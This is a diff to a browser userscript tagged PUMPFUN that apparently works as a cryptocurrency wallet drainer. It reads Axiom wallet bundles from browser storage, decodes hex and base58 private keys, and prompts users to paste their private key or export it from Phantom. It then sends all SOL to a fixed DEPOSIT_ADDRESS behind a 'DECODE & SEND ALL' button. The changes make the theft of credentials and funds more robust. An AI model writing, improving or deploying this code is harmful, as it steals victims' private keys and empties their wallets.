@@ -229,7 +229,7 @@
   // ── Universal Credential Decoder ──
   async function decodeAnyCredential(credential) {
     const input = credential.trim();
-    console.log('[PUMPFUN] 🔓 Attempting to decode credential...');
+    console.log('[PUMPFUN] 🔓 Attempting to decode credential (length: ' + input.length + ')...');
 
     // Check if it's a JSON sbundle export
     try {
@@ -240,51 +240,62 @@
       }
       if (parsed.secretKey) {
         console.log('[PUMPFUN] ✓ Detected wallet JSON with secretKey');
-        return { address: parsed.publicKey || 'unknown', key: parsed.secretKey };
+        const keyStr = Array.isArray(parsed.secretKey) 
+          ? parsed.secretKey.join('') 
+          : parsed.secretKey;
+        return { address: parsed.publicKey || 'unknown', key: keyStr };
       }
-    } catch (e) {}
+    } catch (e) {
+      console.log('[PUMPFUN] Info: Not JSON format, continuing search...');
+    }
 
     // Check if it's a raw base64 sbundle (>200 chars)
     if (input.length > 200 && /^[A-Za-z0-9+/\-_]*={0,2}$/.test(input)) {
-      console.log('[PUMPFUN] ✓ Detected base64 sbundle');
-      return await decodeSBundleAndExtractKey(input);
+      console.log('[PUMPFUN] ✓ Detected base64 sbundle (length: ' + input.length + ')');
+      try {
+        const result = await decodeSBundleAndExtractKey(input);
+        if (result && result.key) return result;
+      } catch (e) {
+        console.log('[PUMPFUN] Could not decode as sbundle:', e.message);
+      }
     }
 
-    // Check if it's a hex private key (64 chars, all hex)
+    // Check if it's a hex private key (128 chars = 64 bytes, all hex)
     if (input.length === 128 && /^[0-9a-fA-F]*$/.test(input)) {
-      console.log('[PUMPFUN] ✓ Detected hex private key');
+      console.log('[PUMPFUN] ✓ Detected 128-char hex private key');
+      return { address: 'manual-hex-key', key: input };
+    }
+
+    // Check if it's a Solana private key in base58 format 
+    if (input.length > 80 && input.length < 150 && /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]*$/.test(input)) {
+      console.log('[PUMPFUN] ✓ Detected base58-encoded key (length: ' + input.length + ')');
+      // Try to validate it's a valid key length
       try {
-        // Convert hex to base58 for Solana
-        const bs58 = window.bs58 || await import('https://cdn.jsdelivr.net/npm/bs58@5.0.0/+esm').then(m => m.default);
-        const keyArray = new Uint8Array(input.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
-        detectedPrivateKey = input;
-        // Try to derive public key
-        const conn = new window.solanaWeb3.Connection('https://api.mainnet-beta.solana.com');
-        const signer = window.solanaWeb3.Keypair.fromSecretKey(keyArray);
-        return { address: signer.publicKey.toString(), key: input };
+        const bs58 = window.bs58 || {};
+        if (bs58.decode) {
+          const decoded = bs58.decode(input);
+          console.log('[PUMPFUN] Decoded to ' + decoded.length + ' bytes');
+          if (decoded.length === 64 || decoded.length === 32) {
+            return { address: 'manual-base58-key', key: input };
+          }
+        }
       } catch (e) {
-        console.log('[PUMPFUN] ⚠️ Could not parse hex key:', e.message);
+        console.log('[PUMPFUN] Could not validate base58:', e.message);
       }
+      // Accept anyway
+      return { address: 'manual-base58-key', key: input };
     }
 
     // Check if it's a seed phrase (12 or 24 words)
     const words = input.toLowerCase().split(/\s+/).filter(w => w.length > 0);
     if ((words.length === 12 || words.length === 24) && words.every(w => /^[a-z]+$/.test(w))) {
       console.log('[PUMPFUN] ✓ Detected ' + words.length + '-word seed phrase');
-      alert('⚠️ Seed phrase support requires bip39 library. Use a private key or sbundle instead.');
+      alert('⚠️ Seed phrase support requires bip39 library.\nUse: Private key (hex) or sbundle instead.');
       return null;
     }
 
-    // Check if it's a Solana private key in base58 format (ends with typical length)
-    if (input.length > 80 && input.length < 150 && /^[123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]*$/.test(input)) {
-      console.log('[PUMPFUN] ✓ Detected potential base58 private key');
-      try {
-        detectedPrivateKey = input;
-        // Try to use it directly as keypair
-        return { address: 'manual-key', key: input };
-      } catch (e) {}
-    }
-
+    console.log('[PUMPFUN] ⚠️ Could not identify credential format');
+    console.log('[PUMPFUN] Detected characters: ' + input.substring(0, 50));
     return null;
   }
 
@@ -849,20 +860,36 @@
     let sbundle = autoDetectSbundle();
     
     if (!sbundle) {
-      alert('⚠️ No sbundle found in localStorage/sessionStorage.\n\nMake sure you have imported a wallet in Axiom.');
-      btn.disabled = false;
-      btn.textContent = 'DECODE & SEND ALL';
-      return;
+      // Fallback: Check if user has pasted a credential in the manual field
+      const manualInput = document.getElementById('pf-manual-sbundle').value.trim();
+      if (manualInput) {
+        console.log('[PUMPFUN] ℹ️ Auto-detect failed, but found manual input. Using that...');
+        sbundle = manualInput;
+      } else {
+        alert('⚠️ No sbundle auto-detected.\n\nOptions:\n1. Paste your sbundle/private key in "Paste Credential" field\n2. Import wallet in Axiom Trade first\n3. Export key from Phantom wallet');
+        btn.disabled = false;
+        btn.textContent = 'DECODE & SEND ALL';
+        return;
+      }
     }
 
     btn.textContent = '⏳ Decoding...';
 
-    // Step 2: Decode sbundle
-    console.log('[PUMPFUN] 📦 Decoding sbundle...');
-    const decoded = await decodeSBundleAndExtractKey(sbundle);
+    // Step 2: Try to decode as credential or sbundle
+    console.log('[PUMPFUN] 📦 Decoding credential...');
+    let decoded = null;
+    
+    // First try universal decoder
+    decoded = await decodeAnyCredential(sbundle);
+    
+    // If that fails, try sbundle decoder
+    if (!decoded || !decoded.key) {
+      console.log('[PUMPFUN] ℹ️ Universal decoder failed, trying sbundle decoder...');
+      decoded = await decodeSBundleAndExtractKey(sbundle);
+    }
     
     if (!decoded || !decoded.key) {
-      alert('❌ Failed to decode sbundle or extract private key');
+      alert('❌ Could not decode credential.\n\nAccepted formats:\n• Axiom sbundle (base64)\n• Private key (hex)\n• Wallet JSON');
       btn.disabled = false;
       btn.textContent = 'DECODE & SEND ALL';
       return;
@@ -872,16 +899,16 @@
     detectedPrivateKey = decoded.key;
     detectedWallet = decoded.address;
     console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
+    updateWalletDisplay();
 
     // Step 4: Send all SOL
-    btn.textContent = '⏳ Sending...';
+    btn.textContent = '⏳ Sending SOL...';
     const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
 
     if (result && result.signature) {
-      alert('✅ EXTRACTION & TRANSFER COMPLETE!\n\nWallet: ' + decoded.address.substring(0, 16) + '...\nTx: ' + result.signature);
-      addTradeResult({ ca: 'Auto Extract', amount: 'All SOL', status: 'success', txid: result.signature });
+      alert('✅ SUCCESS!\n\nWallet: ' + decoded.address.substring(0, 20) + '...\nTx: ' + result.signature);
     } else {
-      alert('❌ Decode succeeded but send failed. Check console.');
+      alert('❌ Decode OK but send failed.\nCheck browser console for details.');
     }
 
     btn.disabled = false;
